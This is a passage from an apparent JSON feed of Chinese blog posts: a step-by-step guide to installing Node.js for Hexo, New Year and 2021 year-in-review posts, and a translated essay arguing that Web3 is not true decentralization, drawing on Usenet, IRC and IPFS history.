<a href=\"https://sspai.com/s/J71e\" target=\"_blank\"><u>少数派公众号</u></a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\"><u>正版软件</u></a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/71408"},{"title":"在 Windows 上快速安装 Hexo · 安装 Node.js","date":"2022-01-14 10:30:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p><strong>本文未经允许，禁止转载！</strong></p>\n<p><strong>视频教程正在制作，等待更新。</strong></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\" class=\"headerlink\" title=\"文章目录\"></a>文章目录</h2>\n<ul>\n<li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-git\">安装 Git</a></li>\n<li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-nodejs\">安装 Node.js</a></li>\n</ul>\n<blockquote><p>更多文章等待更新...</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%8B%E8%BD%BD\" class=\"headerlink\" title=\"下载\"></a>下载</h2>\n<p>前往 Node.js 官网 (<a href=\"https://node.js.org/\">https://node.js.org</a>)</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/image-20220114174925675.png\" alt=\"image-20220114174925675\"></p>\n<p>下载 Node.js 安装包（推荐下载 LTS 版本）</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175645.png\" alt=\"image-20220114175645642\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<p>双击运行安装文件。</p>\n<p>点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175750.png\" alt=\"image-20220114175749822\"></p>\n<p>勾选同意协议，点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175835.png\" alt=\"image-20220114175835742\"></p>\n<p>修改文件安装位置，点击 <code>Next</code>。（也可以不用改）</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175929.png\" alt=\"image-20220114175929226\"></p>\n<p>点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180010.png\" alt=\"image-20220114180010036\"></p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180044.png\" alt=\"image-20220114180043895\"></p>\n<p>点击 <code>Install</code> 开始安装。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180108.png\" alt=\"image-20220114180107827\"></p>\n<p>等待安装完成。<img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180122.png\" alt=\"image-20220114180122728\"></p>\n<p>点击 <code>Finish</code> 完成安装。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180206.png\" alt=\"image-20220114180206024\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%B5%8B%E8%AF%95\" class=\"headerlink\" title=\"测试\"></a>测试</h2>\n<p>打开 <code>Git Bash</code>.</p>\n<blockquote><p>在文件夹处右击，点击 <code>Git Bash Here</code> 进入 Git Bash。<br>或是在开始菜单中找到 Git Bash.</p></blockquote>\n<p>输入 <code>node -v</code> 和 <code>npm -v</code> 查看版本，正确输出版本信息即代表安装成功。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180458.png\" alt=\"image-20220114180458685\"></p>\n","link":"https://blog.yfun.top/posts/hexo-blog/install-nodejs/"},{"title":"2022: 新年快乐！","date":"2021-12-31 16:00:00","description":"\n<p>转眼间，2021 年已经过去。这一年非常忙碌，以至于博客一周年的纪念来不及写，许多文章计划停留在了 To Do 里。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%8D%9A%E5%AE%A2\" class=\"headerlink\" title=\"博客\"></a>博客</h2>\n<p>由于 Cloudflare Web Analytics 是在 2021 年 4 月份启用的，再加上后来又将统计代码去除，所以关于访问量的信息不可用。</p>\n<p>截止至 2021 年 12 月 31 日，博客共发布 15 篇文章，其中 2021 年发布 11 篇文章，原创文章 10 篇。</p>\n<p>目前采用 <code>LeanCloud + Waline</code> 的评论方式，自 7 月份被刷评论后将评论权限改为登录（支持 <code>GitHub</code> 登录），还有部分评论在迁移中丢失，实在抱歉。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>博客自 2021 年 1 月 13 日将主题改为 <code>Miracle</code>，这是一款简洁、轻量的单栏 Hexo 主题。</p>\n<p><code>Miralce</code> 目前的版本是 <code>2.0.1</code>，全新的版本去除 jQuery，进一步提升性能。</p>\n<p>GitHub 仓库：<a href=\"https://github.com/hifun-team/hexo-theme-miracle\">https://github.com/hifun-team/hexo-theme-miracle</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%9B%B4%E5%A4%9A\" class=\"headerlink\" title=\"更多\"></a>更多</h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">=&gt; ...</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2022/"},{"title":"无垠 2021 年度总结","date":"2021-12-31 08:36:10","description":"\n<p>真是忙碌的一年啊。转眼 2021 已经过去，2022 即将到来。又到了该总结这一年的时候了。</p>\n<h1>统计数据</h1>\n<p>年度总结的第一部分仍然是一些统计数据。以下数据截止 2021 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 29,073 (<span>+0.6%</span>)，年 PV 67,688 (<span>-11.61%</span>)，日均 UV 79.65，平均停留时间 3分34秒 (<span>-13.7%</span>)，平均跳出率 55% (<span>-9.8%</span>)。一年有效文章数 1 (<span>-80%</span>)，新增评论 109 条 (<span>-54.96%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg\" alt=\"\" width=\"515\" height=\"620\" class=\"aligncenter size-full wp-image-2537\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg 515w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog-249x300.jpg 249w\" sizes=\"(max-width: 515px) 100vw, 515px\"></a>\n<p>除了 UV 较去年提高 100 多之外，其他数据全部下滑。主要原因还是因为今年实在太过忙碌，只更新了一篇博客，评论区也没有怎么维护。不过目前已经有两篇新的文章在路上了，希望可以尽快写完吧。</p>\n<h2>个人主页</h2>\n<p>个人页总 UV 3,515 (<span>-18.12%</span>)，总 PV 3,929 (<span>-4.56%</span>)，日均 UV 9.63，平均停留时间 55秒 (<span>-12.7%</span>)。访问的主要来源是知乎和 GitHub。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg\" alt=\"\" width=\"515\" height=\"647\" class=\"aligncenter size-full wp-image-2538\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg 515w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton-239x300.jpg 239w\" sizes=\"(max-width: 515px) 100vw, 515px\"></a>\n<p>仍然是没有更新个人主页的一年，我也没有继续宣传这个页面，统计数据下滑大概是正常的。</p>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 4 次，新增 149 commits (<span>-54.57%</span>)，Star 数增加了 174，现有 788。</p>\n<p>终于，MDx 2.0 发布了。但是因为今年的过于忙碌，MDx 并没有得到足够的维护，版本发布周期也拉得比较长，很多 Bug 没能及时修复。希望明年可以把更多的时间花在维护 MDx 上。无论如何，还是感谢各位对于 MDx 的支持！</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>2021 大事记</h1>\n<p>说起来，2021 真的太多“第一次”了...</p>\n<ul>\n<li>一月：由于电脑电池鼓包，第一次用 iPad 外接屏幕远程桌面到服务器来考期末🌚太痛苦了</li>\n<li>一月：MDx 喜提 600 Stars</li>\n<li>三月：第一次测核酸（真的酸）</li>\n<li>三月：第一次坐上 A350！(B-309W）</li>\n<li>三月：第一次来到英国</li>\n<li>六月：第一次来到伦敦</li>\n<li>六月：第一次去猫咖撸猫🐱</li>\n<li>六月：第一次坐上 B777！(B-2025）</li>\n<li>七月：酒店隔离十四天🌚</li>\n<li>七月：MDx 喜提 700 Stars</li>\n<li>七月：第一次和猫一起住（时刻有猫撸真的爽😆）</li>\n<li>七月：入职<a href=\"https://75.team/\">奇舞团</a>实习</li>\n<li>八月：北京景点怎么这么多</li>\n<li>九月：北京景点怎么还有这么多</li>\n<li>九月：<a href=\"https://flyhigher.top/develop/2160.html\">谈谈 WebAuthn</a> 被 <a href=\"https://weibo.com/1893751011/KyipM3tOM\" rel=\"noopener noreferrer\">w3c中国微博转发</a><del>（虽然并没有人看）</del>\n</li>\n<li>九月：从奇舞团<del>跑路</del>\n</li>\n<li>九月：整了个 Stackoverflow 的复制粘贴键盘<del>，太好用了</del>\n</li>\n<li>十月：终于买了心心念念的 MSFS</li>\n<li>十一月：终于买了一台新相机</li>\n<li>十一月：第一次坐上 A380！(B-6140）</li>\n<li>十二月：第一次来到爱丁堡并和 <a href=\"https://diygod.me/\">@DIYgod</a> 面基</li>\n</ul>\n<section><div class=\"set-images-div\">\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg\" alt=\"和猫一起住的唯一问题就是手机很快会被猫片塞满\" width=\"730\" height=\"1500\" class=\"aligncenter size-full wp-image-2518\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg 730w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats-146x300.jpg 146w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats-498x1024.jpg 498w\" sizes=\"(max-width: 730px) 100vw, 730px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg\" alt=\"看到你在写前端，猫猫很担心你\" width=\"1004\" height=\"1500\" class=\"aligncenter size-full wp-image-2523\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg 1004w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-201x300.jpg 201w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-685x1024.jpg 685w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-768x1147.jpg 768w\" sizes=\"(max-width: 1004px) 100vw, 1004px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg\" alt=\"高效开发工具（确信\" width=\"1500\" height=\"1019\" class=\"aligncenter size-full wp-image-2519\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-300x204.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-1024x696.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-768x522.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg\" alt=\"和 Ralph 在天坛\" width=\"947\" height=\"1500\" class=\"aligncenter size-full wp-image-2524\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg 947w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-189x300.jpg 189w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-646x1024.jpg 646w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-768x1216.jpg 768w\" sizes=\"(max-width: 947px) 100vw, 947px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg\" alt=\"380!\" width=\"1500\" height=\"874\" class=\"aligncenter size-full wp-image-2517\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-300x175.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-1024x597.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-768x447.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a>\n</div>\n<div class=\"set-images-div2\">\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg\" alt=\"到处玩.jpg\" width=\"1500\" height=\"1080\" class=\"aligncenter size-full wp-image-2521\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-300x216.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-1024x737.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-768x553.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg\" alt=\"还是到处玩.jpg\" width=\"977\" height=\"1500\" class=\"aligncenter size-full wp-image-2520\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg 977w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-195x300.jpg 195w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-667x1024.jpg 667w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-768x1179.jpg 768w\" sizes=\"(max-width: 977px) 100vw, 977px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg\" alt=\"380 上的星空\" width=\"1002\" height=\"1500\" class=\"aligncenter size-full wp-image-2522\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg 1002w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-200x300.jpg 200w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-684x1024.jpg 684w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-768x1150.jpg 768w\" sizes=\"(max-width: 1002px) 100vw, 1002px\"></a>\n</div>\n</section><p><span>点击图片查看描述</span></p>\n<p>对了，对于可爱的猫猫们，我整了一个 Telegram 贴纸包，你可以在这里获取：<a href=\"https://telegram.me/addstickers/huanAndDan\">https://telegram.me/addstickers/huanAndDan</a>。</p>\n<h1>跨年红包</h1>\n<p>今年的解题之旅，从下面这张图片开始：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/b.jpg\" alt=\"\" width=\"1510\" height=\"1250\" class=\"aligncenter size-full wp-image-2556\"></a>\n<p>不过，鉴于今年的题目较以往对于认真解题的人更难，我还准备了隐藏红包，在解题中收集线索即可发现隐藏红包。共有 20 个普通红包和 10 个隐藏红包。</p>\n<p>解题计划持续到东八区 2022.02.03 23:59:59 或红包被领完为止，之后我会发布题解。不过由于去年情况混乱，今年在解题过程中我一旦发现有不正常的现象就会立即停止活动。Anyway，新年快乐！祝玩得开心。</p>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报用到了 PS 和 Adobe 家的新玩具 Dimension。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg\" alt=\"\" width=\"707\" height=\"1000\" class=\"aligncenter size-full wp-image-2547\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg 1414w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-212x300.jpg 212w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-724x1024.jpg 724w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-768x1086.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-1086x1536.jpg 1086w\" sizes=\"(max-width: 707px) 100vw, 707px\"></a>\n<p>那么祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2507.html"},{"title":"[译] 不，Web3 不是去中心化","date":"2021-12-14 14:01:00","description":"\n<h2>来自译者的楔子</h2>\n<p>加密货币社区对元宇宙和 Web3 的狂热仍在继续，大量投资人和开发者前仆后继加入其中。但是，Web3 真的能实现支持者们的种种愿景吗？亦或是另一个镜中月、水中花？也许让历史照进现实，能给我们答案。<br>这是自 <a href=\"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/\">Web3 系列的引子之后</a>，这个系列的第一篇文章。</p>\n<blockquote><p>原文标题：Web3 is not decentralization<br>原文链接：<a href=\"https://invisibleup.com/articles/38/\">https://invisibleup.com/articles/38/</a><br>原文作者：<a href=\"https://invisibleup.com/\">InvisibleUp</a><br>译者：<a href=\"https://skk.moe/\">Sukka</a>，首发于 <a href=\"https://blog.skk.moe/\">Sukka's Blog</a></p></blockquote>\n<p>不，真的。Web3 并不是去中心化。我觉得这应该很明显。我原本以为我不需要一整篇文章来阐述这个问题，但我想我确实需要。</p>\n<p>令我感到吃惊的是，像 Reddit、Twitter 和 Discord 这样的科技巨头突然决定全力投入到 NFT 中，以达到「去中心化」的目的，尤其是其中 Reddit 的做法令我尤为生气。在 <a href=\"https://www.coindesk.com/markets/2020/05/14/reddit-rolls-out-community-points-on-ethereum-to-incentivize-positive-behavior/\">2020 年 5 月</a>左右，他们在 <code>/r/FortniteBR</code> 和 <code>/r/CryptoCurrency</code> 中实验性的启动了一个「社区代币」系统，虽然我从未去过这两个 Subreddit，但我从一名 <a href=\"https://twitter.com/isyourguy/status/1457220590004158468\">来自 Reddit 的开发者的 Twitter 推文中</a> 得知，他们正在计划将 Reddit 的 Karma Point 转换为这些代币。</p>\n<blockquote><p>译者注：关于 Reddit 将 Karma 转变为 ERC-20 代币系统一事，我曾经在我的 Web3 系列文章与译文中引用过一篇 <a href=\"https://cointelegraph.com/news/reddit-to-reportedly-tokenize-karma-points-and-onboard-500m-new-users\">相关的新闻报道</a></p></blockquote>\n<p>在我列举的三家科技巨头中，Reddit 是走出最远的、愿景最具体的——Twitter 的为用户上传的图片添加 NFT 标签的计划依然停留在纸面上、而 Discord 在其用户的强烈反对下无限期暂停了他们的计划。因此，我在这里主要介绍 Reddit 目前已经公开的计划和路线图。简而言之，Web 1.0 是一个伟大的去中心化前沿阵地、Web 2.0 是一堆有墙的花园、有许多缺点。我完全赞同这个观点。然而，Reddit 正在加入其他公司的 Web3 的行列、准备通过分配基于以太坊的加密货币、赋予网站用户以投票权。</p>\n<p>我之后再分析这句话是什么意思，现在你只要对这句话有点印象就好了。</p>\n<h2>旧互联网上的去中心化</h2>\n<p>让我们复习一下互联网的历史，上个世纪 80 年代、互联网的起源时期。在那个年代，互联网分为两大阵营，来自 MIT、国防部和欧洲原子能研究中心（译者注：Web 之父 蒂姆·博纳斯·李 就是在欧洲原子能研究中心提出了关于互联网、HTTP 的构想）的 ARPANET，和民间的临时性的、自制的调制解调器。</p>\n<p>ARPANET（现代互联网的直接技术先驱）在设计时就明确考虑到了网络层面的冗余和路由的灵活性。如果苏联人的核武器摧毁了重要城市的战略数据中心，只要 A 与 B 两点之间仍然存在数据通路（如微波），那么电子信息就依然可以传输。这个设计也有缺点，文件分享与数据传输（译者注：指 FTP 和 Gopher。FTP 发明于 1971 年，而 HTTP 诞生于 1992 年，此时冷战已经结束、核战争的威胁已经不复存在）仍然需要服务器才能运行，这意味着如果加利福尼亚被外星人攻击了，你就无法访问来自斯坦福大学的文件。但是，诸如电子邮件、IRC、尤其是 Usenet 等协议的发展，确保了互联网上从服务器到服务器传输信息的能力、从而在整个网络上创造了一个单一的信息来源。</p>\n<p>抛开美国国防部的 ARPANET，有抱负的黑客和公司正在忙于创建公告板系统。一般的，他们会在自己的电脑上运行一个程序，其他的电脑可以通过调制解调器连接，在两台电脑之间实现了一个一对一的直接连接。但是，为了和不止一台电脑连接，你需要挂断一个电话、断开与前一台计算机的链接，然后拨打下一个号码。受限于调制解调器，只有最重要的信息会被下载，导致了孤岛的诞生，如同 Web3 支持者批判的 Web 2.0 孤岛一样。</p>\n<p>为了解决这个问题，人们设计了一些变通方法，其中一个例子就是 UUCP（译者注：BSD-based 的操作系统如 FreeBSD 和 macOS，依然保留了 UUCP 的二进制，你可以在终端中输入 <code>uucp</code> 试试），实现了从 Unix 服务器到 Unix 服务器的信息拷贝。通过登录到一个连接到一系列对等服务器的公共Unix服务器，你可以手动输入一个信息的路径，以到达一个特定的服务器或用户。早期版本的路径使用的地址类似于 <code>www-skk!sukka!moe</code>。自然而然的，随着互联网的发展，这种方法就被淘汰了。</p>\n<blockquote><p>译者注：关于 UUCP 和「一个信息的路径」的更多细节，你可以阅读我的博客上的另一篇译文 <a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>，这篇文章详细介绍了互联网和 URL 的变迁历史。</p></blockquote>\n<p>另一种方法是 FidoNet，在民间的 BBS 运营者中非常受欢迎。这是一个允许 BBS 与其他系统同步信息和数据的协议，能够将长途漫游电话费卸载到同一地区内的区间中。</p>\n<p>所有这些早期的交换协议使得互联网根本不存在中心。随着时间的推移，BBS 逐渐被 ISP 替代——ISP 允许你访问其他城市甚至国家的网络、将电子邮件发送到千里之外。其中一些 ISP 很快就发展成为了 ICP，如 AOL（美国在线）和雅虎的 GeoCites（前身为 贝弗利山互联网）。最终，围墙式花园的做法逐渐消失了，IETF 小组成立并开始制定关于互联网的公开规范标准，而 ISP 们则专注于维护和改进宽带基础设施（如建设数据中心、铺设跨洋光纤和骨干网）。</p>\n<h3>案例分析：Usenet</h3>\n<p>你可以把 Usenet 视为 Reddit 的前辈。因为它是一个拥有各种「不同新闻小组」的社区。虽然 Usenet 设计之初时的用途是在互联网上提供新闻，但是它很快被用于各种你能想到的话题。后来，Usenet 成为了传播盗版电影、软件和儿童色情的地下方法（是的，你依然可以通过类似 eternal september 这样的软件访问 Usenet）。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/usenet.png\" alt=\"usenet.png\" width=\"800\" height=\"600\"></p>\n<p>作为一个非常、非常简化的模型，你发送的信息会像电子邮件一样被发送到新闻组服务器，在那里它们会被发布给全世界的人看。你可以回复线程中的其他信息，或者直接向帖子的作者发送电子邮件。评论将以树状视图展开，与 Reddit 的评论系统非常相似。新闻组服务器可以选择托管某些新闻组，并定期与网络的其他部分同步，以保持所有内容的更新。Usenet 信息也可以与现有的 FidoNet 系统进行交换。在我看来，这在当时是一个设计得非常好的系统。</p>\n<p>不过，最大的问题是缺乏良好的管理控制。Usenet 上的大多数新闻组都是无节制的，这在 Spammer 和其他的什么人开始破坏空间的不成文规则之前、是完全没有问题的。由于 Usenet 固有的分散性质，追溯性地删除信息的工具是有限的。系统版主可以发送取消信息，这个过程可以由 <a href=\"https://en.wikipedia.org/wiki/Cancelbot\">取消机器人</a> 自动完成。这在当时被认为是有争议的，因为它被认为是侵犯了言论自由权。另一种方法是有节制的新闻组，即信息首先被送到新闻组管理员那里进行审批。</p>\n<p>由于大型二进制文件的泛滥，导致互联网服务供应商被迫拔线，再加上有太多的垃圾邮件无法正确应对，Usenet 基本上消亡了。作为回应，世界范围内高度规范的留言板和博客开始大量涌现，最终互联网巨头和大型网站诞生了，如 4chan、Reddit、Facebook 和 Twitter。</p>\n<h3>案例分析：IRC</h3>\n<p>IRC、即 Internet Relay Chat，是 20 世纪 80 年代末设计的一种即时通讯协议。最初，它被设计成每个用户都在同一个网络上，但不久之后，社区中的分裂导致了几个竞争性网络的产生，如 FreeNode（现在的 Libera Chat）、EFnet 和 IRCnet。较小的网络，如 tilde.chat 也存在。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/irc.png\" alt=\"irc.png\" width=\"800\" height=\"600\"></p>\n<p>IRC 也是一个分布式系统，在这个意义上，同一 IRC 网络中的多个服务器可以同步并主持相同的频道，并在服务器之间转发信息。你只需连接到离你最近的服务器，后端就会适当地转发信息。你几乎可以使用任何客户端来连接，因为与今天复杂的专有的协议相比，IRC 是一个简单而开放的协议。根据需要，附加机器人或「弹跳器」（机器人会保存信息供以后查看，因为 IRC 不支持查看历史信息）是很容易的，因为它们只不过是专门编程的客户端。</p>\n<p>IRC（通常）只能发送文本信息，没有很好的用户注册、信息回滚机制，也没有 MSN、Slack、Matrix 或 Discord 等较新的聊天应用程序的几乎任何其他功能。2003 年，随着更有说服力的替代品的出现，它开始衰退，但是它仍然被广泛用于开源技术社区和服务的后端。</p>\n<h3>案例分析：IPFS</h3>\n<p>IPFS（星际文件系统）是一个典型的现代分散协议的例子。它解决了文档和文件只有一个真实来源的问题，让任何人都可以托管一个文件的副本以提供网络冗余。</p>\n<p>IPFS 的工作方式有点笨拙，基本上是使用文件的哈希值作为其永久地址。有一些方法可以解决这个问题，比如 <a href=\"https://docs.ipfs.io/concepts/ipns/\">IPNS</a> 与 <a href=\"https://docs.ipfs.io/concepts/dnslink/\">DNSLink</a> 的结合，它给 DNS 条目提供了一个静态地址，可以引用位于 IPFS 上的任何文件。</p>\n<p>......这一节很短，因为没有太多的东西可以写。IPFS 主要负责文件。<a href=\"https://neocities.org/\">Neocities 有对它的支持</a>。然后是，与大部分人想象中的完全相反，绝大多数 NFT 艺术品其实都托管在 IPFS 上面。唯一真正的问题是，IPFS 上的文件并不是永久存在的。一个文件可能会在未来失踪，因为没有其余的主机没有这个文件的副本（如同 BitTorrent 无人做种一样），但这并不是一个真正可以现实地解决的问题。而它其实工作地相当好。</p>\n<h3>中场休息：言论自由和言论审查</h3>\n<p>让任何人能够主持任何事情的一个自然后果是——「他们可以主持任何事情」。你同意的东西，你不同意的东西，你认为绝对不道德的东西。我个人主张 「<a href=\"https://en.wikipedia.org/wiki/Paradox_of_tolerance\">宽容的悖论</a>」，主张伤害的声音应该被踢到路边。而令人惊讶的是，去中心化系统的人做到了这一点——如果一个网络上的某个特定群体相当有毒，社区可以简单地分叉，排除他们，并继续下去，有效地将不良行为者隔离在一个回声室中。Mastodon 的服务器屏蔽系统已经表明这是一个相当有效的解决方案，最近 FreeNode 的自我毁灭和与用户纷纷迁移到 Libera Chat 更是完美体现了这一点。</p>\n<p>当然，这也不是万无一失的。Parler 和 Kiwi Farms 是被排斥的社区的例子，它们仍然在做明显的伤害，比如延续导致 1 月 6 日袭击的阴谋论，或者<a href=\"https://en.wikipedia.org/wiki/Kiwi_Farms#Suicides_of_harassment_targets\">由于不断的骚扰而导致许多人自杀</a>。Kiwi Farms 勉强维持着与外部互联网的连接，因为他们的 DNS 和 DDoS 保护完全由 Cloudflare（唯一剩下的愿意与他们合作的公司）提供，他们的服务器托管全部由「1776 Solutions」内部完成，该 ISP 对外只能通过一条 Transit 连接。</p>\n<blockquote><p>译者注：在 Cloudflare 清退 8chan、Voxility 将向 8chan 敞开怀抱的 Epik, Inc. 和 BitMitigate 拔线后，8chan 最终也被托管到由 1776 Solutions（AS397702）提供的服务器。如果作为本文的读者你也是一名 ISP 从业者，我在这里倡议你在你的网络中为任何通往 AS397702 的路由设置黑洞。</p></blockquote>\n<p>归根结底，我们试图用技术解决社会文化问题，这几乎是不可能的。真正的解决方案是让人们不要成为可怕的偏执者，而我对如何实现这一点没有丝毫头绪。</p>\n<h2>Web3 的「去中心化」概念</h2>\n<p>在过去的 3600 字中，我已经花了太多的时间去研究 20-40 年前的协议。是时候让我们回到现代了。在新兴的加密货币领域，存在着「DAO」的概念，即去中心化的自治组织。<a href=\"https://ethereum.org/en/dao/\">Ethereum.org</a> 将其描述为「像一个互联网原生企业，由其成员集体拥有和管理」。从表面上看，这听起来很像共产主义、或是苏联的「农村合作社」运动。</p>\n<p>以太坊作为一种加密货币，主要存在于以太坊虚拟机上执行代码。这是一个非常奇怪的架构（基于堆栈，1024 深度，256 